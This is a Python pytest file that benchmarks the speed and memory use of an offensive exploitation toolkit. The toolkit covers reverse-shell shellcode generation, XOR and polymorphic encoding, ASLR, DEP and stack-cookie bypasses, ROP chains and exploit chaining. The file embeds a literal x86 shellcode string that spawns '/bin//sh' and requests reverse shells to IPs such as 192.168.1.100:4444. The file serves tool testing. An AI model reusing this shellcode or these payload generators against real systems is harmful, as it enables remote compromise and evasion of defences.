import pytest
import time
import threading
import tempfile
import os
import psutil
from unittest.mock import patch, MagicMock

from intellicrack.core.exploitation.shellcode_generator import ShellcodeGenerator
from intellicrack.core.exploitation.payload_engine import PayloadEngine
from intellicrack.core.exploitation.polymorphic_engine import PolymorphicEngine
from intellicrack.core.exploitation.encoder_engine import EncoderEngine
from intellicrack.core.exploitation.bypass_engine import BypassEngine
from intellicrack.core.exploitation.aslr_bypass import ASLRBypass
from intellicrack.core.exploitation.dep_bypass import DEPBypass
from intellicrack.core.exploitation.assembly_compiler import AssemblyCompiler


class TestExploitationPerformance:
    """Performance benchmarks for exploitation and payload generation."""

    @pytest.fixture
    def sample_shellcode(self):
        """Generate REAL shellcode for testing."""
        return b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    @pytest.fixture
    def vulnerable_binary_path(self):
        """Create test vulnerable binary."""
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_file:
            dos_header = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
            dos_header += b'\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00'
            dos_header += b'\x00' * 40
            dos_header += b'\x80\x00\x00\x00'
            dos_header += b'\x00' * 60

            pe_signature = b'PE\x00\x00'
            coff_header = b'\x4c\x01\x03\x00' + b'\x00' * 16

            optional_header = b'\x0b\x01\x0e\x00' + b'\x00' * 220

            temp_file.write(dos_header + pe_signature + coff_header + optional_header)
            temp_file.flush()
            yield temp_file.name

        try:
            os.unlink(temp_file.name)
        except:
            pass

    @pytest.fixture
    def process_memory(self):
        """Monitor process memory usage."""
        process = psutil.Process()
        return process.memory_info()

    @pytest.mark.benchmark
    def test_shellcode_generation_performance(self, benchmark, sample_shellcode):
        """Benchmark REAL shellcode generation performance."""
        def generate_shellcode():
            generator = ShellcodeGenerator()
            return generator.generate_reverse_shell("192.168.1.100", 4444, "windows", "x64")

        result = benchmark(generate_shellcode)

        assert result is not None, "Shellcode generation must return actual shellcode"
        assert len(result) > 0, "Generated shellcode must not be empty"
        assert benchmark.stats.mean < 0.1, "Shellcode generation should be under 100ms"

    @pytest.mark.benchmark
    def test_payload_encoding_performance(self, benchmark, sample_shellcode):
        """Benchmark REAL payload encoding operations."""
        def encode_payload():
            encoder = EncoderEngine()
            return encoder.encode_shellcode(sample_shellcode, "xor", iterations=3)

        result = benchmark(encode_payload)

        assert result is not None, "Encoded payload must be returned"
        assert len(result) > 0, "Encoded payload must not be empty"
        assert result != sample_shellcode, "Encoded payload must be different from original"
        assert benchmark.stats.mean < 0.05, "Payload encoding should be under 50ms"

    @pytest.mark.benchmark
    def test_polymorphic_generation_performance(self, benchmark, sample_shellcode):
        """Benchmark REAL polymorphic code generation."""
        def generate_polymorphic():
            engine = PolymorphicEngine()
            return engine.generate_polymorphic_wrapper(sample_shellcode, complexity=5)

        result = benchmark(generate_polymorphic)

        assert result is not None, "Polymorphic wrapper must be generated"
        assert len(result) > len(sample_shellcode), "Polymorphic code should be larger than original"
        assert benchmark.stats.mean < 0.2, "Polymorphic generation should be under 200ms"

    @pytest.mark.benchmark
    def test_assembly_compilation_performance(self, benchmark):
        """Benchmark REAL assembly compilation speed."""
        asm_code = """
        push ebp
        mov ebp, esp
        sub esp, 0x40
        push eax
        push ebx
        mov eax, [ebp+8]
        xor ebx, ebx
        add eax, ebx
        pop ebx
        pop eax
        mov esp, ebp
        pop ebp
        ret
        """

        def compile_assembly():
            compiler = AssemblyCompiler()
            return compiler.compile_x86(asm_code)

        result = benchmark(compile_assembly)

        assert result is not None, "Assembly compilation must return bytecode"
        assert len(result) > 0, "Compiled bytecode must not be empty"
        assert benchmark.stats.mean < 0.1, "Assembly compilation should be under 100ms"

    @pytest.mark.benchmark
    def test_aslr_bypass_generation_performance(self, benchmark, vulnerable_binary_path):
        """Benchmark REAL ASLR bypass technique generation."""
        def generate_aslr_bypass():
            bypass = ASLRBypass()
            return bypass.generate_info_leak_exploit(vulnerable_binary_path)

        result = benchmark(generate_aslr_bypass)

        assert result is not None, "ASLR bypass must be generated"
        assert 'gadgets' in result or 'leak' in result, "Result must contain exploit information"
        assert benchmark.stats.mean < 1.0, "ASLR bypass generation should be under 1 second"

    @pytest.mark.benchmark
    def test_dep_bypass_generation_performance(self, benchmark, vulnerable_binary_path):
        """Benchmark REAL DEP bypass technique generation."""
        def generate_dep_bypass():
            bypass = DEPBypass()
            return bypass.generate_rop_chain(vulnerable_binary_path, target_function="VirtualProtect")

        result = benchmark(generate_dep_bypass)

        assert result is not None, "DEP bypass must be generated"
        assert len(result) > 0, "ROP chain must not be empty"
        assert benchmark.stats.mean < 0.5, "DEP bypass generation should be under 500ms"

    @pytest.mark.benchmark
    def test_payload_engine_comprehensive_performance(self, benchmark):
        """Benchmark comprehensive REAL payload generation."""
        def generate_comprehensive_payload():
            engine = PayloadEngine()
            config = {
                'target': 'windows',
                'arch': 'x64',
                'type': 'reverse_shell',
                'lhost': '127.0.0.1',
                'lport': 4444,
                'encoding': 'xor',
                'iterations': 2,
                'polymorphic': True
            }
            return engine.generate_payload(config)

        result = benchmark(generate_comprehensive_payload)

        assert result is not None, "Comprehensive payload must be generated"
        assert 'payload' in result, "Result must contain payload data"
        assert 'metadata' in result, "Result must contain metadata"
        assert len(result['payload']) > 0, "Payload must not be empty"
        assert benchmark.stats.mean < 0.3, "Comprehensive payload generation should be under 300ms"

    @pytest.mark.benchmark
    def test_exploit_chaining_performance(self, benchmark, vulnerable_binary_path):
        """Benchmark REAL exploit chain construction."""
        def build_exploit_chain():
            bypass_engine = BypassEngine()

            chain = bypass_engine.build_exploit_chain([
                {'type': 'info_leak', 'target': vulnerable_binary_path},
                {'type': 'rop_chain', 'function': 'VirtualProtect'},
                {'type': 'shellcode', 'payload': 'reverse_shell'}
            ])
            return chain

        result = benchmark(build_exploit_chain)

        assert result is not None, "Exploit chain must be built"
        assert 'stages' in result, "Chain must contain stages"
        assert len(result['stages']) > 0, "Chain must have stages"
        assert benchmark.stats.mean < 1.5, "Exploit chaining should be under 1.5 seconds"

    def test_shellcode_generation_memory_usage(self, process_memory):
        """Test REAL shellcode generation memory efficiency."""
        initial_memory = process_memory.rss

        generator = ShellcodeGenerator()

        for i in range(100):
            shellcode = generator.generate_reverse_shell("127.0.0.1", 4444 + i, "windows", "x64")
            assert shellcode is not None, f"Shellcode generation {i} failed"
            assert len(shellcode) > 0, f"Generated shellcode {i} is empty"

        current_process = psutil.Process()
        final_memory = current_process.memory_info().rss
        memory_increase = final_memory - initial_memory

        assert memory_increase < 50 * 1024 * 1024, "Memory increase should be under 50MB for 100 shellcodes"

    def test_payload_encoding_memory_efficiency(self, sample_shellcode, process_memory):
        """Test REAL payload encoding memory efficiency."""
        initial_memory = process_memory.rss

        encoder = EncoderEngine()

        for i in range(50):
            encoded = encoder.encode_shellcode(sample_shellcode, "xor", iterations=i % 5 + 1)
            assert encoded is not None, f"Encoding iteration {i} failed"
            assert len(encoded) > 0, f"Encoded payload {i} is empty"
            assert encoded != sample_shellcode, f"Encoded payload {i} unchanged"

        current_process = psutil.Process()
        final_memory = current_process.memory_info().rss
        memory_increase = final_memory - initial_memory

        assert memory_increase < 25 * 1024 * 1024, "Memory increase should be under 25MB for 50 encodings"

    def test_concurrent_shellcode_generation(self):
        """Test REAL concurrent shellcode generation performance."""
        results = []
        errors = []

        def generate_shellcode(thread_id):
            try:
                generator = ShellcodeGenerator()
                shellcode = generator.generate_reverse_shell("192.168.1.100", 4444 + thread_id, "windows", "x64")
                results.append((thread_id, shellcode))
            except Exception as e:
                errors.append((thread_id, str(e)))

        threads = []
        start_time = time.time()

        for i in range(10):
            thread = threading.Thread(target=generate_shellcode, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join(timeout=5.0)

        end_time = time.time()

        assert len(errors) == 0, f"Concurrent generation errors: {errors}"
        assert len(results) == 10, f"Expected 10 results, got {len(results)}"
        assert end_time - start_time < 2.0, "Concurrent generation should complete under 2 seconds"

        for thread_id, shellcode in results:
            assert shellcode is not None, f"Thread {thread_id} returned None"
            assert len(shellcode) > 0, f"Thread {thread_id} returned empty shellcode"

    def test_exploitation_module_stress_test(self, sample_shellcode):
        """Stress test REAL exploitation modules under load."""
        generator = ShellcodeGenerator()
        encoder = EncoderEngine()
        polymorphic = PolymorphicEngine()

        start_time = time.time()

        for i in range(20):
            shellcode = generator.generate_reverse_shell("127.0.0.1", 4444, "windows", "x64")
            assert shellcode is not None, f"Shellcode generation {i} failed"

            encoded = encoder.encode_shellcode(shellcode, "xor", iterations=2)
            assert encoded is not None, f"Encoding {i} failed"
            assert encoded != shellcode, f"Encoding {i} produced identical output"

            poly = polymorphic.generate_polymorphic_wrapper(encoded, complexity=3)
            assert poly is not None, f"Polymorphic generation {i} failed"
            assert len(poly) > len(encoded), f"Polymorphic {i} not larger than original"

        end_time = time.time()

        assert end_time - start_time < 10.0, "Stress test should complete under 10 seconds"

    @pytest.mark.benchmark
    def test_bypass_engine_comprehensive_performance(self, benchmark, vulnerable_binary_path):
        """Benchmark comprehensive REAL bypass engine operations."""
        def run_comprehensive_bypass():
            engine = BypassEngine()
            results = {}

            results['aslr'] = engine.generate_aslr_bypass(vulnerable_binary_path)
            results['dep'] = engine.generate_dep_bypass(vulnerable_binary_path)
            results['stack_cookies'] = engine.generate_stack_cookie_bypass(vulnerable_binary_path)

            return results

        result = benchmark(run_comprehensive_bypass)

        assert result is not None, "Comprehensive bypass must return results"
        assert 'aslr' in result, "ASLR bypass must be included"
        assert 'dep' in result, "DEP bypass must be included"
        assert 'stack_cookies' in result, "Stack cookie bypass must be included"
        assert benchmark.stats.mean < 2.0, "Comprehensive bypass should be under 2 seconds"

    def test_exploitation_error_handling_performance(self):
        """Test REAL exploitation error handling performance."""
        generator = ShellcodeGenerator()
        encoder = EncoderEngine()

        start_time = time.time()

        invalid_inputs = [
            ("", 4444, "windows", "x64"),
            ("127.0.0.1", -1, "windows", "x64"),
            ("127.0.0.1", 4444, "", "x64"),
            ("127.0.0.1", 4444, "windows", ""),
            (None, 4444, "windows", "x64")
        ]

        for host, port, os_type, arch in invalid_inputs:
            try:
                result = generator.generate_reverse_shell(host, port, os_type, arch)
                if result is not None and len(result) > 0:
                    pass
            except Exception:
                pass

        for invalid_shellcode in [None, b"", "invalid", 123]:
            try:
                result = encoder.encode_shellcode(invalid_shellcode, "xor", iterations=1)
                if result is not None:
                    pass
            except Exception:
                pass

        end_time = time.time()

        assert end_time - start_time < 1.0, "Error handling should be fast (under 1 second)"

    def test_exploitation_consistency_check(self):
        """Test REAL exploitation module consistency across multiple runs."""
        generator = ShellcodeGenerator()

        configs = [
            ("192.168.1.1", 4444, "windows", "x64"),
            ("10.0.0.1", 8080, "linux", "x86"),
            ("127.0.0.1", 9999, "windows", "x86")
        ]

        for config in configs:
            results = []

            for _ in range(5):
                shellcode = generator.generate_reverse_shell(*config)
                results.append(shellcode)

            for result in results:
                assert result is not None, f"Shellcode generation failed for {config}"
                assert len(result) > 0, f"Empty shellcode for {config}"

            if len(set(results)) == 1:
                continue
